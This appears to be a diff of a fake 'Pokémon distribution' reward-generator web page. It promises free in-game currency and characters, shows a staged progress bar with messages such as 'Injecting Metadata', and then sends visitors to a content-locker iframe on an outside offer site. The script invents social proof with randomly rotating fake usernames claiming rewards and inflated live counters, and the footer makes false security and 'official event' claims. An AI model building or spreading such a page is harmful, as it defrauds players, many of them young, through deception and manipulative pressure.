@@ -37,7 +37,7 @@
 
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
 
-        .container { display: flex; flex-direction: column; align-items: center; padding: 20px 15px 60px; }
+        .container { display: flex; flex-direction: column; align-items: center; padding: 20px 15px 40px; min-height: 80vh; }
 
         .trust-header { text-align: center; margin-bottom: 25px; }
         .trust-header span { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 2px; color: var(--primary); font-weight: 900; }
@@ -117,7 +117,6 @@
         #progress-bar-container { width: 100%; background: #111; height: 6px; border-radius: 10px; overflow: hidden; margin: 20px 0; }
         #progress-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.3s; box-shadow: 0 0 10px var(--primary); }
 
-        /* Locker Styles */
         #locker-frame { width: 100%; height: 450px; border: none; border-radius: 15px; background: rgba(0,0,0,0.2); margin-top: 10px; }
         .persuasive-box {
             background: rgba(255, 235, 59, 0.1); border-left: 4px solid #ffeb3b;
@@ -125,7 +124,6 @@
         }
         .persuasive-box p { font-size: 0.85rem; color: #ffeb3b; margin: 0; font-weight: 700; line-height: 1.4; }
 
-        /* NOTIFICATION SYSTEM */
         #notification-box {
             position: fixed; bottom: 20px; left: 20px; z-index: 200;
             background: rgba(10, 15, 30, 0.95); border: 1px solid var(--border);
@@ -147,16 +145,23 @@
         .stat-box { text-align: center; }
         .stat-box div:first-child { font-weight: 900; font-size: 0.9rem; color: var(--primary); }
         .stat-box div:last-child { font-size: 0.55rem; color: #555; text-transform: uppercase; font-weight: 700; }
+
+        /* Footer Details */
+        footer {
+            width: 100%; padding: 40px 5%; background: rgba(0,0,0,0.6);
+            border-top: 1px solid var(--border); margin-top: 50px; text-align: center;
+        }
+        .footer-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; max-width: 1000px; margin: 0 auto; text-align: left; }
+        .footer-col h4 { color: var(--primary); font-family: 'Orbitron'; font-size: 0.8rem; margin-bottom: 15px; }
+        .footer-col p { font-size: 0.7rem; color: #666; line-height: 1.6; }
+        .footer-bottom { margin-top: 30px; font-size: 0.65rem; color: #444; border-top: 1px solid rgba(255,255,255,0.05); padding-top: 20px; }
     </style>
 </head>
 <body>
 
 <nav>
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/International_Pok%C3%A9mon_logo.svg" class="logo-nav">
-    <div class="server-status">
-        <div class="status-dot"></div>
-        SECURE SERVER ACTIVE
-    </div>
+    <div class="server-status"><div class="status-dot"></div>SECURE SERVER ACTIVE</div>
 </nav>
 
 <div id="notification-box">
@@ -168,9 +173,7 @@
 </div>
 
 <div class="container">
-    <div class="trust-header">
-        <span>Official Season 12 Distribution Event</span>
-    </div>
+    <div class="trust-header"><span>Official Season 12 Distribution Event</span></div>
 
     <div class="main-card">
         <div class="step-map">
@@ -183,14 +186,8 @@
             <h2 style="font-family: 'Orbitron'; font-size: 1.4rem; margin-bottom: 5px;">Verify Trainer</h2>
             <input type="text" class="input-ui" id="trainer-id" placeholder="Username / ID...">
             <div class="platform-grid">
-                <div class="platform-item active" onclick="selectPlatform(this)">
-                    <i class="fab fa-android" style="color: #3DDC84;"></i>
-                    <span>ANDROID</span>
-                </div>
-                <div class="platform-item" onclick="selectPlatform(this)">
-                    <i class="fab fa-apple" style="color: #fff;"></i>
-                    <span>IOS / IPAD</span>
-                </div>
+                <div class="platform-item active" onclick="selectPlatform(this)"><i class="fab fa-android" style="color: #3DDC84;"></i><span>ANDROID</span></div>
+                <div class="platform-item" onclick="selectPlatform(this)"><i class="fab fa-apple" style="color: #fff;"></i><span>IOS / IPAD</span></div>
             </div>
             <button class="btn-action" onclick="toStep2()">Check Eligibility</button>
         </div>
@@ -199,50 +196,20 @@
             <div class="back-btn" onclick="backTo(1)"><i class="fas fa-chevron-left"></i> Back</div>
             <div class="section-title">1. RESOURCES</div>
             <div class="grid-layout">
-                <div class="reward-card active" onclick="selectItem(this, '50,000 VP', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png" class="reward-img">
-                    <span>50,000</span><small>Victory Points</small>
-                </div>
-                <div class="reward-card" onclick="selectItem(this, '10,000 Gems', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/rare-candy.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/rare-candy.png" class="reward-img">
-                    <span>10,000</span><small>Champion Gems</small>
-                </div>
-                <div class="reward-card" onclick="selectItem(this, 'Elite Pass', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/eon-ticket.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/eon-ticket.png" class="reward-img">
-                    <span>Elite Pass</span><small>Season 12</small>
-                </div>
-                <div class="reward-card" onclick="selectItem(this, 'Omni Stone', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/mega-ring.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/mega-ring.png" class="reward-img">
-                    <span>Omni Stone</span><small>Evolution</small>
-                </div>
+                <div class="reward-card active" onclick="selectItem(this, '50,000 VP', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png" class="reward-img"><span>50,000</span><small>Victory Points</small></div>
+                <div class="reward-card" onclick="selectItem(this, '10,000 Gems', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/rare-candy.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/rare-candy.png" class="reward-img"><span>10,000</span><small>Champion Gems</small></div>
+                <div class="reward-card" onclick="selectItem(this, 'Elite Pass', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/eon-ticket.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/eon-ticket.png" class="reward-img"><span>Elite Pass</span><small>Season 12</small></div>
+                <div class="reward-card" onclick="selectItem(this, 'Omni Stone', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/mega-ring.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/mega-ring.png" class="reward-img"><span>Omni Stone</span><small>Evolution</small></div>
             </div>
 
             <div class="section-title">2. CHAMPIONS</div>
             <div class="grid-layout">
-                <div class="reward-card" onclick="selectItem(this, 'Charizard', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/6.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/6.png" class="reward-img char">
-                    <span>Charizard</span>
-                </div>
-                <div class="reward-card" onclick="selectItem(this, 'Lucario', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/448.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/448.png" class="reward-img char">
-                    <span>Lucario</span>
-                </div>
-                <div class="reward-card" onclick="selectItem(this, 'Garchomp', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/445.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/445.png" class="reward-img char">
-                    <span>Garchomp</span>
-                </div>
-                <div class="reward-card" onclick="selectItem(this, 'Mewtwo', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/150.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/150.png" class="reward-img char">
-                    <span>Mewtwo</span>
-                </div>
-                <div class="reward-card" onclick="selectItem(this, 'Rayquaza', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/384.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/384.png" class="reward-img char">
-                    <span>Rayquaza</span>
-                </div>
-                <div class="reward-card" onclick="selectItem(this, 'Greninja', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/658.png')">
-                    <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/658.png" class="reward-img char">
-                    <span>Greninja</span>
-                </div>
+                <div class="reward-card" onclick="selectItem(this, 'Charizard', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/6.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/6.png" class="reward-img char"><span>Charizard</span></div>
+                <div class="reward-card" onclick="selectItem(this, 'Lucario', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/448.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/448.png" class="reward-img char"><span>Lucario</span></div>
+                <div class="reward-card" onclick="selectItem(this, 'Garchomp', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/445.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/445.png" class="reward-img char"><span>Garchomp</span></div>
+                <div class="reward-card" onclick="selectItem(this, 'Mewtwo', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/150.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/150.png" class="reward-img char"><span>Mewtwo</span></div>
+                <div class="reward-card" onclick="selectItem(this, 'Rayquaza', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/384.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/384.png" class="reward-img char"><span>Rayquaza</span></div>
+                <div class="reward-card" onclick="selectItem(this, 'Greninja', 'https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/658.png')"><img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/other/official-artwork/658.png" class="reward-img char"><span>Greninja</span></div>
             </div>
             <button class="btn-action" style="margin-top: 25px;" onclick="toStep3()">Generate Assets</button>
         </div>
@@ -251,70 +218,57 @@
             <img id="item-preview" src="" class="selected-preview">
             <h4 id="status-text" style="color: var(--primary); font-family: 'Orbitron'; font-size: 0.8rem; margin-top: 10px;">Connecting...</h4>
             <div class="loader"></div>
-            <div id="progress-bar-container">
-                <div id="progress-bar"></div>
-            </div>
-            <p id="sync-success-text" class="hidden" style="color: var(--success); font-weight: 800; font-size: 0.9rem;">Sync Success!</p>
+            <div id="progress-bar-container"><div id="progress-bar"></div></div>
         </div>
 
         <div id="ui-locker" class="hidden">
             <h2 style="font-family: 'Orbitron'; color: var(--primary); font-size: 1.2rem;">Final Verification</h2>
-            
-            <div class="persuasive-box">
-                <p>⚠️ Your <span id="final-res" style="color:#fff;">Asset</span> has been reserved for your Trainer ID. Complete the final anti-bot verification below to release it. If you close this page, the reward will be automatically re-allocated to the next player in queue.</p>
-            </div>
-
+            <div class="persuasive-box"><p>⚠️ Reserved for <span id="final-res" style="color:#fff;">Asset</span>. Complete the anti-bot verification below to release the sync to your account.</p></div>
             <iframe src="https://checkmyapp.store/cl/i/grj4r3" id="locker-frame"></iframe>
-            
-            <p style="font-size: 0.6rem; color: #444; margin-top: 10px;">© 2026 Official Pokémon Distribution System</p>
         </div>
     </div>
 
     <div class="live-stats">
         <div class="stat-box"><div id="count-online">1,290</div><div>Online Now</div></div>
-        <div class="stat-box"><div>45.2K</div><div>Syncs Today</div></div>
+        <div class="stat-box"><div id="count-syncs">45,210</div><div>Syncs Today</div></div>
         <div class="stat-box"><div style="color: var(--success);">Online</div><div>Server Status</div></div>
     </div>
 </div>
 
+<footer>
+    <div class="footer-grid">
+        <div class="footer-col"><h4>Secure Encryption</h4><p>All data packets are synchronized using end-to-end AES-256 protocols for verified Trainer IDs.</p></div>
+        <div class="footer-col"><h4>Official Event</h4><p>Season 12 distribution is a limited-time promotional event. Rewards are non-transferable.</p></div>
+    </div>
+    <div class="footer-bottom">© 2026 Official Pokémon Distribution System. Not affiliated with Nintendo.</div>
+</footer>
+
 <script>
-    let currentSelection = "Assets";
+    let currentSelection = "50,000 VP";
     let selectedImg = "https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png";
+    const usaNames = ["James_99", "Sarah.M", "Jackson_TX", "Emma_W", "Robert.B", "Olivia.P", "Will_Cook", "Sophia_G", "Michael.R", "Isabella_W", "David_NYC", "Mia_Sports", "Richard_H", "Charlotte_K", "Joseph_A", "Amelia_M", "Thomas_J", "Harper_L", "Charles_D", "Evelyn_F", "Chris_M", "Abigail_S", "Daniel_V", "Emily_D", "Matthew_K", "Elizabeth_R", "Anthony_P", "Avery_B", "Donald_G", "Sofia_N", "Mark_L", "Ella_Z", "Paul_W", "Madison_T", "Steven_M", "Scarlett_H", "Andrew_B", "Victoria_C", "Kenneth_D", "Luna_X"];
+    const actions = ["Synced Mewtwo!", "Got 50,000 VP", "Claimed Rayquaza!", "Received Elite Pass", "Synced Charizard!", "Obtained 10,000 Gems"];
 
-    // USA Names List (40 Names)
-    const usaNames = [
-        "James_99", "Sarah.Miller", "Jackson_TX", "Emma_Wilson", "Robert.B", "Olivia.P", "William_Cook", "Sophia_G", "Michael.R", "Isabella_W",
-        "David_NYC", "Mia_Sports", "Richard_H", "Charlotte_K", "Joseph_A", "Amelia_M", "Thomas_J", "Harper_L", "Charles_D", "Evelyn_F",
-        "Christopher_M", "Abigail_S", "Daniel_V", "Emily_D", "Matthew_K", "Elizabeth_R", "Anthony_P", "Avery_B", "Donald_G", "Sofia_N",
-        "Mark_L", "Ella_Z", "Paul_W", "Madison_T", "Steven_M", "Scarlett_H", "Andrew_B", "Victoria_C", "Kenneth_D", "Luna_X"
-    ];
-
-    // Actions List
-    const actions = [
-        "Just synced Mewtwo!", "Obtained 50,000 VP", "Claimed Rayquaza!", "Received Elite Pass",
-        "Synced Charizard!", "Obtained 10,000 Gems", "Unlocked Greninja", "Claimed Omni Stone",
-        "Just received Garchomp!", "Verified Lucario Sync"
-    ];
+    // Live Counter Logic
+    let online = 1290;
+    let syncs = 45210;
+    setInterval(() => {
+        online += Math.floor(Math.random() * 5) - 2;
+        syncs += Math.floor(Math.random() * 3);
+        document.getElementById('count-online').innerText = online.toLocaleString();
+        document.getElementById('count-syncs').innerText = syncs.toLocaleString();
+    }, 3000);
 
     function showNotification() {
-        const notif = document.getElementById('notification-box');
         const user = usaNames[Math.floor(Math.random() * usaNames.length)];
         const action = actions[Math.floor(Math.random() * actions.length)];
-        
         document.getElementById('notif-user').innerText = user;
         document.getElementById('notif-action').innerText = action;
         document.getElementById('notif-avatar').innerText = user.charAt(0);
-        
-        notif.classList.add('show');
-        
-        setTimeout(() => {
-            notif.classList.remove('show');
-        }, 4000);
+        document.getElementById('notification-box').classList.add('show');
+        setTimeout(() => document.getElementById('notification-box').classList.remove('show'), 4000);
     }
-
-    // Start Notif Cycle
     setInterval(showNotification, 8000);
-    setTimeout(showNotification, 2000); // First notif after 2s
 
     function selectPlatform(el) {
         document.querySelectorAll('.platform-item').forEach(i => i.classList.remove('active'));
@@ -331,8 +285,6 @@
     function backTo(step) {
         document.getElementById('ui-step1').classList.add('hidden');
         document.getElementById('ui-step2').classList.add('hidden');
-        document.getElementById('ui-locker').classList.add('hidden');
-        document.getElementById('ui-sync').classList.add('hidden');
         document.getElementById('ui-step' + step).classList.remove('hidden');
         if(step === 1) document.getElementById('dot2').classList.remove('active');
     }
@@ -350,21 +302,12 @@
         document.getElementById('dot3').classList.add('active');
         document.getElementById('item-preview').src = selectedImg;
         document.getElementById('final-res').innerText = currentSelection;
-        
         let p = 0;
         const msg = ["Locating Trainer ID...", "Injecting Metadata...", "Finalizing Handshake...", "Sync Success!"];
         const inv = setInterval(() => {
-            p += 1;
-            document.getElementById('progress-bar').style.width = p + '%';
+            p++; document.getElementById('progress-bar').style.width = p + '%';
             if(p % 25 === 0) document.getElementById('status-text').innerText = msg[Math.floor(p/25)-1];
-            if(p >= 100) {
-                clearInterval(inv);
-                document.getElementById('sync-success-text').classList.remove('hidden');
-                setTimeout(() => {
-                    document.getElementById('ui-sync').classList.add('hidden');
-                    document.getElementById('ui-locker').classList.remove('hidden');
-                }, 1000);
-            }
+            if(p >= 100) { clearInterval(inv); setTimeout(() => { document.getElementById('ui-sync').classList.add('hidden'); document.getElementById('ui-locker').classList.remove('hidden'); }, 800); }
         }, 50);
     }
 </script>
